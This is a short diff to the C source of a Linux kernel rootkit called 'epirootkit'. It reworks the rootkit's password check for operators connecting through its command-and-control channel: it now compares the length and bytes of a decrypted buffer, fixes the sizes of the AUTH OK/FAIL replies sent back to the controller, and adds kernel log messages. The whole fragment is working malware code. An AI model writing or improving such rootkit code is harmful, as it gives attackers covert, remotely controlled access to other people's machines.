@@ -130,14 +130,18 @@ static int command_loop(void *data) {
         buffer[len] = '\0';
 
         if (!authenticated) {
-            if (strcmp(buffer, config.password) == 0) {
-                authenticated = 1;
-                send_to_c2("AUTH OK\n--EOF--\n", 14);
-            } else {
-                send_to_c2("AUTH FAIL\n--EOF--\n", 16);
-            }
-            continue;
-        }
+    		if (len == strlen(config.password) &&
+        		memcmp(decrypted, config.password, len) == 0) {
+        		authenticated = 1;
+        		send_to_c2("AUTH OK\n--EOF--\n", 16);
+        		printk(KERN_INFO "epirootkit: Authentication successful\n");
+    		} else {
+        		send_to_c2("AUTH FAIL\n--EOF--\n", 18);
+        		printk(KERN_WARNING "epirootkit: Authentication failed\n");
+    		}
+    		continue;
+		}
+
 
         size_t input_len = strcspn(buffer, "\r\n");
         buffer[input_len] = '\0';
